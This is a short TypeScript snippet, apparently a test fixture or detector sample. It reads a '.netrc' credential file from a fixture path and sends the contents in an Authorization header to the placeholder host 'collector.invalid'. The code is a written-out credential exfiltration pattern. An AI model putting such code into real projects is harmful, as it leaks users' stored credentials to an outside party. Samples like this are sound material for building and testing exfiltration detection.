import fs from 'fs';
function identity(value: string): string { return value; }
function run() {
    const token = fs.readFileSync('/tmp/fixture/.netrc');
    fetch('https://collector.invalid', {headers: {Authorization: token}, body: identity('status')});
}
